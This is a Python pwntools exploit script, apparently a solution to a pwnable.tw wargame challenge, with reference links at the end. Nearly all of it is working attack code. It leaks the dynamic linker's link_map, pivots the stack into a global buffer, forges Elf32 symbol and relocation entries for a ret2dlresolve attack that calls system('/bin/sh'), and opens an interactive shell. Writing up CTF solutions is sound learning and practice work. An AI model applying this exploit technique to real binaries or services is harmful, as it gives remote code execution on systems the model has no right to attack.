from pwn import *


###Utils
def setname(data):
    r.sendlineafter('> ','6')
    r.sendlineafter('> ','2')
    r.sendlineafter(': ',data)
    r.sendlineafter('> ','1')

def execname(payload):
    r.sendlineafter('> ',b'-33'.ljust(8,b'\x00')+payload)

###Useful addr
puts_plt = 0x8048b90
read_plt = 0x8048a70
GOT = 0x8055000
PLT = 0x8048940
SYMTAB = 0x80481dc
STRTAB = 0x80484fc
VERSYM = 0x80486f2
JMPREL = 0x80487c8
name_buf = 0x80580d0

###ROPgadget
add_esp_0x1c = 0x8048e48
leave = 0x8048c58
popx4 = 0x080491b9
popx3 = 0x080491ba
popx2 = 0x080491bb
popx1 = 0x080491bc
pop_ebp = 0x80491bc

###Exploit
r = remote('chall.pwnable.tw',10202)

###Leak linkmap + Stack migration to name_buf
setname(p32(add_esp_0x1c))

ROPchain  = p32(puts_plt)
ROPchain += p32(popx1)
ROPchain += p32(GOT+0x4)
ROPchain += p32(pop_ebp)
ROPchain += p32(name_buf-0x4)
ROPchain += p32(read_plt)
ROPchain += p32(leave)
ROPchain += p32(0)
ROPchain += p32(name_buf)
ROPchain += p32(0x100)
execname(ROPchain)

linkmap = u32(r.recv()[:4])+0xe4

###ret2dlresolve
#  Command
sh_str_addr = name_buf+0x30
sh_str = b'/bin/sh\x00'

#  Function
sys_str_addr = name_buf+0x40
sys_str = b'system\x00'

#  Alignment
padding_len = (SYMTAB)&0xf

#  Fake Elf32_Sym
fake_sym_addr = name_buf+0x50+padding_len
Elf_sym  = p32(sys_str_addr-STRTAB) #st_name    ptr2system_str
Elf_sym += p32(0)                   #st_value   unused
Elf_sym += p32(0)                   #st_size    unused
Elf_sym += p32(0)                   #st_info    unused
                                    #st_other   &3=0
                                    #st_shnndx  unused

#  Fake Elf32_Rel
fake_rel_addr = name_buf+0x60+padding_len
Elf_rel  = p32(name_buf+0x70)       #r_offset   abitrary_writable_addr
r_info = (fake_sym_addr-SYMTAB)//16
r_info = (r_info<<8)|7
Elf_rel += p32(r_info)              #r_info

#  ROPchain
#    read into l->l_info[VERSYMIDX(DT_VERSYM)]
ROPchain  = p32(read_plt)
ROPchain += p32(popx3)
ROPchain += p32(0)
ROPchain += p32(linkmap)
ROPchain += p32(0x4)
#    ret2dlresolve
ROPchain += p32(PLT)
ROPchain += p32(fake_rel_addr-JMPREL)
ROPchain += p32(0)
ROPchain += p32(sh_str_addr)
ROPchain  = ROPchain.ljust(0x30,b'\x00')+sh_str
ROPchain  = ROPchain.ljust(0x40,b'\x00')+sys_str
ROPchain  = ROPchain.ljust(0x50+padding_len,b'\x00')+Elf_sym
ROPchain  = ROPchain.ljust(0x60+padding_len,b'\x00')+Elf_rel

r.send(ROPchain)
#    overwrite l->l_info[VERSYMIDX(DT_VERSYM)] to NULL
r.send(p32(0))

###get shell
r.interactive()



###Reference
#  ret2dlresolve angelboy_slides
#    http://angelboy.logdown.com/posts/283218-return-to-dl-resolve
#  ret2dlresolve veritas_blog
#    https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
#  ret2dlresolve phrack issue
#    http://phrack.org/issues/58/4.html
